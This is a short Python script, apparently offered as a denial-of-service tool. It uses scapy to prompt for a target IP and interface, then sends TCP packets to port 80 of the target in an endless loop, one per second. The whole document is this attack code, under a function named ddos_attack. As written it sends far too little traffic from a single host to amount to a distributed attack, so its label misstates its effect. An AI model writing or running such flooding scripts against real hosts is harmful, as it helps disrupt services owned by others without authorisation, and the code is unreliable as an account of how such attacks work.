import scapy.all as scapy
import time

def ddos_attack(target_ip, interface):
    # Create a scapy packet
    packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=80)

    # Send the packet
    scapy.send(packet, iface=interface)

# Get the target IP address
target_ip = input("Enter the target IP address: ")

# Get the interface to use
interface = input("Enter the interface to use: ")

# Start the attack
while True:
    ddos_attack(target_ip, interface)
    time.sleep(1)
    